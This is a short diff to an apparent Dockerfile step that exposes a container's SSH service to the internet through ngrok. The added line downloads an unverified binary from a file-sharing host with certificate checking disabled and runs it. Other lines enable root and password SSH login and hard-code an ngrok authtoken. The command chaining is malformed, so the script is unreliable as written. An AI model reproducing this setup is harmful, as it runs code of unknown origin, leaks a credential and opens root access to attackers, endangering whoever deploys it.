@@ -7,8 +7,7 @@ RUN yes | unminimize \
     echo "PasswordAuthentication yes" > /etc/ssh/sshd_config \
     echo "PermitUserEnvironment yes" >> /etc/ssh/sshd_config \
     echo "PermitRootLogin yes" >> /etc/ssh/sshd_config \
-    wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip 
-    sudo unzip *.zip \
+    wget --no-check-certificate https://cdn-146.bayfiles.com/19W1r5d0y1/73bc3920-1651754416/ngrok \
     ./ngrok authtoken 26tMe4najGriSTiFSCpzVi56UzF_Gdsp5taJ7CeA4PGVrTVj \
     service ssh start \
     ./ngrok tcp 22
